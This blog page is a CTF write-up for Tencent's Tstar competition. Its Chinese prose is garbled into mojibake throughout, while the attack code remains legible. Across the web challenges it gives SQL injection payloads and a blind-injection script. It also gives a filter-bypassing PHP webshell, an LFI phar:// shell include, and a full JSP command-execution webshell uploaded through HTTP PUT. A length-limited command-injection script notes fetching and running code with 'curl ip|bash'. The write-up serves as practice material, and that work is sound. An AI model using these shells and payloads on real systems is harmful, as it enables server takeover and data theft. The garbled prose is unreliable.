<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="è…¾è®¯Tstaré«˜æ ¡æŒ‘æˆ˜èµ› Writeup"><meta name="keywords" content=""><meta name="author" content="Neorah"><meta name="copyright" content="Neorah"><title>è…¾è®¯Tstaré«˜æ ¡æŒ‘æˆ˜èµ› Writeup | Neorah's Blog</title><link rel="shortcut icon" href="/img/melody-favicon32.ico"><link rel="stylesheet" href="/css/index.css?version=1.7.0"><link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css?version=1.7.0"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer></script><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: {"appId":"DBINOT6FYU","apiKey":"c9a16d407275792c2b0577f2e8765356","indexName":"dev_Neorah","hits":{"per_page":10},"languages":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}.","hits_stats":"${hits} results found in ${time} ms"}},
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#å‰è¨€"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ç­¾åˆ°"><span class="toc-number">2.</span> <span class="toc-text">ç­¾åˆ°</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#å‘½ä»¤æ‰§è¡ŒåŸºç¡€"><span class="toc-number">3.</span> <span class="toc-text">å‘½ä»¤æ‰§è¡ŒåŸºç¡€</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ä½ èƒ½çˆ†ç ´å—"><span class="toc-number">4.</span> <span class="toc-text">ä½ èƒ½çˆ†ç ´å—</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æ–‡ä»¶ä¸Šä¼ "><span class="toc-number">5.</span> <span class="toc-text">æ–‡ä»¶ä¸Šä¼ </span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æ–‡ä»¶åŒ…å«getshell"><span class="toc-number">6.</span> <span class="toc-text">æ–‡ä»¶åŒ…å«getshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#æˆç»©å•"><span class="toc-number">7.</span> <span class="toc-text">æˆç»©å•</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#å°çŒ«å’ªè¸©ç¯æ³¡"><span class="toc-number">8.</span> <span class="toc-text">å°çŒ«å’ªè¸©ç¯æ³¡</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#åˆ†æä»£ç è·å¾—flag"><span class="toc-number">9.</span> <span class="toc-text">åˆ†æä»£ç è·å¾—flag</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql1"><span class="toc-number">10.</span> <span class="toc-text">sql1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql2"><span class="toc-number">11.</span> <span class="toc-text">sql2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#é¢„æœŸè§£"><span class="toc-number">11.0.1.</span> <span class="toc-text">é¢„æœŸè§£</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#if"><span class="toc-number">11.0.1.1.</span> <span class="toc-text">if</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#æ­£åˆ™åŒ¹é…"><span class="toc-number">11.0.1.2.</span> <span class="toc-text">æ­£åˆ™åŒ¹é…</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#éé¢„æœŸè§£"><span class="toc-number">11.0.2.</span> <span class="toc-text">éé¢„æœŸè§£</span></a></li></ol></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/neorah.jpg"></div><div class="author-info__name text-center">Neorah</div><div class="author-info__description text-center"></div><div class="follow-button"><a href="https://github.com/Neorah" target="_blank" rel="noopener">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">33</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">33</span></a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(/img/top.JPG)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Neorah's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Posts</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a><a class="site-page" href="/about">About</a></span><span class="pull-right"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a></span></div><div id="post-info"><div id="post-title">è…¾è®¯Tstaré«˜æ ¡æŒ‘æˆ˜èµ› Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-07-01</time><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">1.9k</span><span class="post-meta__separator">|</span><span>Reading time: 7 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™åœºæ¯”èµ›æ˜¯æ˜¨å¤©Tstarçš„é¶åœºèµ›ï¼Œç”±äºæ•´ä¸ªæ¯”èµ›ä¸»çº¿æ˜¯æ¸—é€æµ‹è¯•ï¼Œæ‰€ä»¥è¿™å‡ ä¸ªé¢˜æ¯”è¾ƒç®€å•ã€‚ä½†æœ‰ä¸¤ä¸ªsqlæˆ‘è¿˜æ˜¯æ²¡æœ‰åšå‡ºæ¥5555ã€‚</p>
<img src="/Tstar/1.png" class="">

<p>çœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpåï¼Œåˆå­¦åˆ°äº†æ–°çŸ¥è¯†ğŸ‘ğŸ»ã€‚</p>
<h1 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h1><p>æ¯”è¾ƒç®€å•ï¼Œå°±æ˜¯ä¸Šä¼ æœ¨é©¬æ—¶æŠ“åŒ…æ”¹åç¼€å°±å¥½äº†ã€‚</p>
<p>è¿æ¥å°±å¥½äº†ã€‚</p>
<img src="/Tstar/2.png" class="">

<h1 id="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"><a href="#å‘½ä»¤æ‰§è¡ŒåŸºç¡€" class="headerlink" title="å‘½ä»¤æ‰§è¡ŒåŸºç¡€"></a>å‘½ä»¤æ‰§è¡ŒåŸºç¡€</h1><img src="/Tstar/3.png" class="">

<p>æ²¡æœ‰ä»€ä¹ˆè¿‡æ»¤ï¼Œæ‰€ä»¥ç›´æ¥æ‰§è¡Œæ‰¾flagå°±å¥½äº†ã€‚</p>
<h1 id="ä½ èƒ½çˆ†ç ´å—"><a href="#ä½ èƒ½çˆ†ç ´å—" class="headerlink" title="ä½ èƒ½çˆ†ç ´å—"></a>ä½ èƒ½çˆ†ç ´å—</h1><p>çœ‹è¿™ä¸ªé¢˜ç›®ä¸€å¼€å§‹æˆ‘ä»¥ä¸ºæ˜¯çˆ†ç ´ï¼Ÿç„¶åå°±ä¸¢ç»™burpè·‘äº†ä¸‹ï¼Œç»“æœå‘ç°å¯†ç å°±æ˜¯adminï¼Œæ‰“æ‰°æƒ¹ã€‚</p>
<p>ç„¶ååœ¨responseé‡Œçœ‹åˆ°äº†set-cookieï¼Œå›é¡µé¢çœ‹çœ‹ã€‚</p>
<img src="/Tstar/4.png" class="">

<p>å‘ç°cookieä¸º<code>uname=YWRtaW4%3D</code>ï¼Œè§£ç çœ‹äº†ä¸‹å°±æ˜¯adminã€‚</p>
<p>å¹¶ä¸”è¿™ä¸ªé¡µé¢è¿˜ç»™äº†æŸ¥è¯¢è¯­å¥ä¸ºï¼š</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">"admin"</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>é‚£å°±æ˜¯cookieæ³¨å…¥æƒ¹ã€‚æ‰€ä»¥æŠŠæ³¨å…¥è¯­å¥base64ç¼–ç åæ›¿æ¢æ‰cookieå°±å¥½äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,2,3 #</span><br></pre></td></tr></table></figure>

<p>çœ‹åˆ°å›æ˜¾ä½åå°±å¯ä»¥æ³¨å…¥äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,(group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),user()#</span><br></pre></td></tr></table></figure>

<p>è¡¨åä¸ºflag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;&#39;flag&#39;#</span><br></pre></td></tr></table></figure>

<p>æŸ¥flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0&quot; union select 1,flag,3 from flag#</span><br></pre></td></tr></table></figure>



<h1 id="æ–‡ä»¶ä¸Šä¼ "><a href="#æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–‡ä»¶ä¸Šä¼ "></a>æ–‡ä»¶ä¸Šä¼ </h1><p>è¿™é“é¢˜æŠŠä¿ºå‘äº†ï¼Œå®³å¾—æˆ‘åšäº†å¥½ä¹…ã€‚</p>
<p>ä¸‹æ¬¡æˆ‘å¿…å®šå…ˆfuzzä¸€ä¸‹ä»€ä¹ˆä¼šè¢«è¿‡æ»¤- -</p>
<p>è¿™é“é¢˜ä¸»è¦å°±æ˜¯åœ¨æ£€æµ‹æ›¿æ¢äº†<code>&lt;?</code>ã€<code>php</code>ã€<code>eval</code>ï¼Œå› æ­¤åŒå†™ç»•è¿‡å°±å¯ä»¥äº†ã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬ä¸Šä¼ å›¾ç‰‡åæŠ“å–è¯·æ±‚åŒ…ï¼Œæ£€æµ‹äº†å†…å®¹å¤§å°ï¼Œæ‰€ä»¥ç›´æ¥åœ¨å›¾ç‰‡å†…å®¹é‡Œæ·»åŠ æœ¨é©¬å°±å¥½äº†ã€‚</p>
<p>æ„é€ çš„å†…å®¹ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;??phphpp evevalal($_GET[&#39;hhhh&#39;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>æˆ–è€…ï¼ˆä¸»è¦ä¸€å¼€å§‹æ²¡å‘ç°æ›¿æ¢äº†evalâ€¦å¦‚æœä½¿ç”¨è¿™ä¸ªåŠæ³•å°±æ²¡äº‹äº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&lt;??phphpp system(&#39;ls &#x2F;&#39;); ?&gt;</span><br></pre></td></tr></table></figure>

<p>ç„¶åä¿®æ”¹æ–‡ä»¶ååç¼€ä¸º<code>.pht</code>ä¸Šä¼ å°±å¯ä»¥äº†ã€‚</p>
<h1 id="æ–‡ä»¶åŒ…å«getshell"><a href="#æ–‡ä»¶åŒ…å«getshell" class="headerlink" title="æ–‡ä»¶åŒ…å«getshell"></a>æ–‡ä»¶åŒ…å«getshell</h1><img src="/Tstar/5.png" class="">

<p>æç¤ºäº†LFIï¼Œç‚¹è¿›å»æ˜¯lfi.phpï¼Œé‚£å¤§æ¦‚å°±æ˜¯æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´äº†8.</p>
<p>æ³¨é‡Šé‡Œæç¤ºäº†lfi.txtï¼Œè¿›å»çœ‹åˆ°æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file = $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span> ($file != <span class="string">''</span>) &#123;</span><br><span class="line">    $inc = sprintf(<span class="string">"%s.php"</span>, $file); <span class="comment">// only php file can be included</span></span><br><span class="line">    <span class="keyword">include</span>($inc);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœç„¶æ˜¯äº†ã€‚</p>
<p>ä¸Šä¼ çš„æ—¶å€™åªèƒ½ä¸Šä¼ txtæ–‡ä»¶ï¼Œå¹¶ä¸”ä»æºç ä¸­å¯ä»¥çœ‹å‡ºåœ¨æ–‡ä»¶ååŠ äº†.phpã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>phar://</code>ã€<code>zip://</code>åè®®è¯»å–ã€‚</p>
<p>æŠŠshell.phpæ‰“åŒ…æˆzipï¼Œå†æ”¹åç¼€ä¸ºtxtä¸Šä¼ ã€‚</p>
<img src="/Tstar/6.png" class="">

<p>ä¸Šä¼ æˆåŠŸäº†ã€‚è¯•è¯•èƒ½ä¸èƒ½ç”¨</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;966ca955.yunyansec.com&#x2F;lfi.php?file&#x3D;phar:&#x2F;&#x2F;files&#x2F;nhqUchi0zQtA0 APg.txt&#x2F;shell2&amp;hhhh&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>

<img src="/Tstar/7.png" class="">

<p>ç„¶åè¿æ¥shellå°±é˜”ä»¥äº†ã€‚</p>
<h1 id="æˆç»©å•"><a href="#æˆç»©å•" class="headerlink" title="æˆç»©å•"></a>æˆç»©å•</h1><p>ç›´æ¥ç”¨sqlmapè·‘å°±å¯ä»¥äº†ã€‚</p>
<h1 id="å°çŒ«å’ªè¸©ç¯æ³¡"><a href="#å°çŒ«å’ªè¸©ç¯æ³¡" class="headerlink" title="å°çŒ«å’ªè¸©ç¯æ³¡"></a>å°çŒ«å’ªè¸©ç¯æ³¡</h1><p>è¿™é“é¢˜æœ¬æ¥æ˜¯æœ‰éš¾åº¦çš„ï¼Ÿä½†æ˜¯å‡ºé¢˜äººéå¸¸å¥½å¿ƒåœ°å†é¢˜ç›®æè¿°ä¸­ç»™äº†cveç¼–å·ã€‚</p>
<img src="/Tstar/8.png" class="">

<p>ç„¶åå°±ç™¾åº¦åˆ°äº†ã€‚</p>
<p>æ€è·¯å¤§æ¦‚å°±æ˜¯åˆ©ç”¨HTTP PUTè¯·æ±‚æ–¹æ³•ï¼Œå°†æ„é€ å¥½çš„jspæ–‡ä»¶ä¼ åˆ°æœåŠ¡å™¨ä¸Šï¼Œjspæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç è¢«æœåŠ¡å™¨æ‰§è¡Œï¼Œè¿›è€Œè·å–åˆ°æœåŠ¡å™¨æƒé™ã€‚</p>
<p>ç”¨burpæŠ“åŒ…ï¼Œå…ˆçœ‹çœ‹è¢«å…è®¸çš„è¯·æ±‚æ–¹å¼ï¼š</p>
<img src="/Tstar/9.png" class="">

<p>å…è®¸PUTï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨PUTä¸Šä¼ jspåŒ…äº†ï¼š</p>
<img src="/Tstar/10.png" class="">

<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page language=<span class="string">"java"</span> <span class="keyword">import</span>=<span class="string">"java.util.*,java.io.*"</span> pageEncoding=<span class="string">"UTF-8"</span>%&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">excuteCmd</span><span class="params">(String c)</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">StringBuilder line = <span class="keyword">new</span> StringBuilder();</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span> &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(pro.getInputStream()));</span><br><span class="line"> </span><br><span class="line">String temp = <span class="keyword">null</span>;<span class="keyword">while</span> ((temp = buf.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line"> </span><br><span class="line">line.append(temp+<span class="string">"\n"</span>);&#125;buf.close();&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"> </span><br><span class="line">line.append(e.getMessage());&#125;<span class="keyword">return</span> line.toString();&#125;%&gt;&lt;%<span class="keyword">if</span>(<span class="string">"666"</span>.equals(request.getParameter(<span class="string">"pwd"</span>))&amp;&amp;!<span class="string">""</span>.equals(request.getParameter(<span class="string">"cmd"</span>)))&#123;</span><br><span class="line"> </span><br><span class="line">out.println(<span class="string">"&lt;pre&gt;"</span>+excuteCmd(request.getParameter(<span class="string">"cmd"</span>))+<span class="string">"&lt;/pre&gt;"</span>);&#125;<span class="keyword">else</span>&#123;out.println(<span class="string">":-)"</span>);&#125;%&gt;</span><br></pre></td></tr></table></figure>

<img src="/Tstar/11.png" class="">

<p>æˆåŠŸä¸Šä¼ ã€‚è¯•è¯•æ‰§è¡Œå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;3d0706f0.yunyansec.com&#x2F;shell1.jsp?cmd&#x3D;ls%20&#x2F;&amp;pwd&#x3D;666</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰¾flagæ–‡ä»¶è¯»å–å°±å¥½äº†ã€‚</p>
<h1 id="åˆ†æä»£ç è·å¾—flag"><a href="#åˆ†æä»£ç è·å¾—flag" class="headerlink" title="åˆ†æä»£ç è·å¾—flag"></a>åˆ†æä»£ç è·å¾—flag</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  error_reporting(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">7</span>)&#123;</span><br><span class="line">       <span class="keyword">echo</span> shell_exec($_GET[<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å…­å­—ç¬¦é™åˆ¶getshell</p>
<p>å¯ä»¥å‚è€ƒğŸŒŸğŸŒŸçš„è¿™ç¯‡<a href="https://x5tar.com/2020/04/18/bypass-char-number-limit/" target="_blank" rel="noopener">æ–‡ç« </a></p>
<p>ä»–å†™å¾—çœŸçš„å¾ˆè¯¦ç»†äº†ï¼Œæ‰€ä»¥å°±ä¸é‡æ–°å†™äº†ã€‚</p>
<p>é¡ºä¾¿å·ä¸€æ³¢ä»–çš„è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shells = [</span><br><span class="line">    <span class="string">"&gt;ls\\"</span>,</span><br><span class="line">    <span class="string">"ls&gt;_"</span>,</span><br><span class="line">    <span class="string">"&gt;\ \\"</span>,</span><br><span class="line">    <span class="string">"&gt;-t\\"</span>,</span><br><span class="line">    <span class="string">"&gt;\&gt;v"</span>,</span><br><span class="line">    <span class="comment"># ls -t&gt;v</span></span><br><span class="line">    </span><br><span class="line">â€¦  <span class="comment"># curl ip|bash é€‚å½“åˆ†å‰²å¹¶é€†å‘æ”¾ç½®</span></span><br><span class="line">    </span><br><span class="line">    <span class="string">"sh _"</span></span><br><span class="line">]</span><br><span class="line">url = <span class="string">"http://c3ee93c4.yunyansec.com/"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> shell <span class="keyword">in</span> shells:</span><br><span class="line">    print(shell)</span><br><span class="line">    r = requests.get(url, params=&#123;<span class="string">'1'</span>: shell&#125;)</span><br></pre></td></tr></table></figure>

<p>æ”¾åœ¨æœåŠ¡å™¨ä¸Šçš„å‘½ä»¤ä¸ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat ..&#x2F;key</span><br></pre></td></tr></table></figure>

<p>ç„¶åæ‰§è¡Œ<code>sh v</code>å³å¯å¾—åˆ°flag</p>
<p>å™¢å¯¹è¿™é“é¢˜è¿˜æœ‰ä¸ªæ›´ç®€å•çš„æ–¹æ³•ã€‚</p>
<p>å…ˆå†™å…¥cat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;&gt;cat</span><br></pre></td></tr></table></figure>

<p>è¾“å…¥é€šé…ç¬¦<code>*</code>,linuxä¼šæŠŠç¬¬ä¸€ä¸ªåˆ—å‡ºçš„æ–‡ä»¶åå½“ä½œå‘½ä»¤ï¼Œå‰©ä¸‹çš„æ–‡ä»¶åå½“ä½œå‚æ•°ã€‚</p>
<p>ç„¶åçœ‹åˆ°flagæ‰€åœ¨æ–‡ä»¶åœ¨ä¸Šä¸€å±‚</p>
<img src="/Tstar/12.png" class="">

<p>ç›´æ¥ä½¿ç”¨catè¯»å–ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;* ..&#x2F;*</span><br></pre></td></tr></table></figure>

<p>å°±è¯»åˆ°flagäº†ã€‚</p>
<h1 id="sql1"><a href="#sql1" class="headerlink" title="sql1"></a>sql1</h1><p>ç»ˆäºåˆ°äº†ä¼—æœ›æ‰€å½’çš„sqläº†ï¼Œç„¶è€Œsql1é›¶è§£ï¼Œæˆ‘å®åœ¨ä¸æ‡‚è¿™é“200åˆ†çš„é›¶è§£é¢˜è¿˜èƒ½æœ‰å¤šéš¾çš„åšæ³•ã€‚ç­‰å®˜æ–¹wpå§ã€‚</p>
<h1 id="sql2"><a href="#sql2" class="headerlink" title="sql2"></a>sql2</h1><p>sql2æˆ‘æ€è·¯æ­ªäº†å‘œå‘œã€‚ä¸»è¦æ˜¯sql1å’Œsql2ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªç½‘é¡µï¼Œå‡ºé¢˜äººè¯´æœ‰ä¸¤å¤„flagã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¥ä¸ºæ˜¯åœ¨ä¸¤ä¸ªæ³¨å…¥ç‚¹æ¯å¤„åˆ†åˆ«æœ‰ä¸€ä¸ªflagã€‚</p>
<p>åˆšå¥½è¿™é“é¢˜åœ¨ç™»é™†ç•Œé¢å’Œpictureç•Œé¢æœ‰ä¸¤å¤„æ³¨å…¥ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä¸€ç›´ä»¥ä¸ºä»–ä»¬æ˜¯ç‹¬ç«‹çš„ã€‚</p>
<p>åœ¨ç™»é™†å¤„æ€ä¹ˆéƒ½æ²¡æœ‰å›æ˜¾ï¼Œæˆ‘ä¹Ÿçˆ†ç ´äº†ä¸‹ä¹Ÿæ²¡æœ‰å¼±å£ä»¤å¯†ç ã€‚æ‰€ä»¥é å¿ƒçµæ„Ÿåº”ï¼Ÿï¼Ÿå› ä¸ºsql2æœ‰5è§£äº†ï¼Œsql1è¿˜0è§£ï¼Œæ‰€ä»¥æˆ‘ä»¥ä¸ºè¿™ä¸ªç‚¹æ˜¯sql1çš„ï¼Œå› ä¸ºå¤ªé å¿ƒçµæ„Ÿåº”äº†æ‰€ä»¥æ²¡äººè§£å‡ºæ¥ã€‚</p>
<p>äº‹å®è¯æ˜æ˜¯æˆ‘é”™äº†ã€‚ç™»é™†æ³¨å…¥ç‚¹å¾—åˆ°çš„flagæ˜¯sql2çš„â€¦è¿™é“é¢˜æ˜¯åœ¨pictureå¤„å¾—åˆ°å¯†ç ï¼Œç„¶åæ‹¿åˆ°ç™»é™†ç•Œé¢å»ç™»é™†ï¼Œç™»é™†è¿›å»å°±å¾—åˆ°flagäº†ã€‚</p>
<p>è¡Œ8</p>
<p>åœ¨åšé¢˜çš„æ—¶å€™æ‰«äº†ä¸‹å¾—åˆ°ä»¥ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SQL_DETECT</span><span class="params">($PictureId)</span></span>&#123;</span><br><span class="line">    $a0=urldecode(<span class="string">'%a0'</span>);</span><br><span class="line">    $PictureId=str_replace(<span class="string">'\d'</span>, <span class="string">''</span>, $PictureId);</span><br><span class="line">    $PictureId=str_replace($a0, <span class="string">''</span>, $PictureId);</span><br><span class="line">    $PictureId=str_replace(<span class="string">'\/\*.*?\*\/'</span>, <span class="string">''</span>, $PictureId);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/union|order.*by|and|\dor\d|\|\||sleep|BENCHMARK|substr|ascii|select|mid|right|left|right|substring|substring_index|INSTR|LOCATE/i'</span>, $PictureId))&#123;</span><br><span class="line"></span><br><span class="line">        $PictureId=<span class="string">'1'</span>;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $PictureId;</span><br><span class="line">&#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤çš„æ¯”è¾ƒæ­»ï¼Œç„¶åæˆ‘æµ‹è¯•äº†ä¸‹ï¼Œç”¨ä»¥ä¸‹è„šæœ¬çˆ†å‡ºäº†æ•°æ®åº“åã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://95f82c36.yunyansec.com/picture.php'</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'1"^(ord(reverse(lpad(database(),&#123;&#125;,1)))&gt;&#123;&#125;)-- '</span></span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">128</span></span><br><span class="line">    mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        payload = &#123;<span class="string">'id'</span>: payload1.format(i, mid)&#125;</span><br><span class="line">        r = s.get(url=url, params=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"found"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid == <span class="number">32</span> <span class="keyword">or</span> mid == <span class="number">132</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºäº†æ•°æ®åº“åä¸ºwafã€‚</p>
<p>ç„¶åå› ä¸ºè¿‡æ»¤äº†selectä»€ä¹ˆçš„ï¼Œç”¨äº†å¥½å‡ ç§åŠæ³•éƒ½æ²¡æœ‰ç»•è¿‡å‘œå‘œå‘œï¼Œæˆ‘å°±æ”¾å¼ƒæƒ¹ã€‚</p>
<p>ç»“æŸåçœ‹äº†ä¸‹åˆ«äººå†™çš„wpï¼Œtql5555</p>
<h3 id="é¢„æœŸè§£"><a href="#é¢„æœŸè§£" class="headerlink" title="é¢„æœŸè§£"></a>é¢„æœŸè§£</h3><p>å…ˆçŒœè§£å­˜åœ¨çš„å­—æ®µï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Picture.php?id&#x3D;0&quot; | if(ord(password),1,null) %23</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå­˜åœ¨ password å­—æ®µï¼Œåˆ™è¿”å›æ­£å¸¸é¡µé¢.</p>
<p>æˆ‘æ²¡æƒ³åˆ°ç›´æ¥çŒœè§£å­—æ®µâ€¦è°çŸ¥é“ä»–åœ¨é‡Œé¢ä¼šæ”¾è¿™äº›å­—æ®µå‘¢- -å­¦åˆ°äº†</p>
<p>ç»è¿‡çŒœè§£åå‘ç°å­˜åœ¨<code>username</code>ã€<code>password</code>ã€<code>id</code>ã€<code>picture</code>ã€‚æ‰€ä»¥passwordå’Œå›¾ç‰‡éƒ½åœ¨åŒä¸€ä¸ªè¡¨é‡Œâ€¦å°±å¯ä»¥ç»§ç»­çŒœè§£usernameå’Œpasswordå†…å®¹äº†ã€‚</p>
<p>ç„¶åç»§ç»­çŒœè§£</p>
